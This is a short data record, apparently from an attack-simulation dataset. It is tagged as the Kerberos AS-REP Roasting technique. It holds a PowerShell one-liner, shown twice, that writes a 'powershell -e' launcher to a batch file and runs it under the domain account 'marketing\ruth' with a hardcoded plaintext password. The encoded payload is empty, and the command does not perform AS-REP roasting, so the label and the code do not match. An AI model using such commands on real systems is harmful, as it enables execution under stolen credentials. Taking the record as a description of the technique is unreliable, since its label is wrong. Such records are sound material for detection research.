attack_metadata.technique_name: Steal or Forge Kerberos Tickets: AS-REP Roasting

command: cd "C:\Scripts\";$scriptContent = 'powershell -e ';$scriptContent | Out-File -FilePath "C:\Scripts\agent.bat" -Encoding ASCII;$username = 'marketing\ruth';$password = 'Real@12345';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Start-Process "C:\Scripts\agent.bat" -Credential $credential
plaintext_command: cd "C:\Scripts\";$scriptContent = 'powershell -e ';$scriptContent | Out-File -FilePath "C:\Scripts\agent.bat" -Encoding ASCII;$username = 'marketing\ruth';$password = 'Real@12345';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Start-Process "C:\Scripts\agent.bat" -Credential $credential
